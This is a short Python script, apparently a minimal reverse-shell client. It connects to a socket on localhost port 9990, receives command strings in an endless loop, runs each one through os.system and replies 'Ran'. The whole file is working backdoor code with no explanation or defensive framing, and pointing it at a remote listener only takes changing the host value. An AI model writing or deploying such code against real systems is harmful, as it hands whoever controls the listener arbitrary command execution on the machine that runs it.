import time
import socket
import sys
import os

s = socket.socket()
host = "127.0.0.1"
port = 9990
s.connect((host, port))

while True:
    command = s.recv(1024)

    command = command.decode()

    os.system(command)

    s.send("Ran".encode())
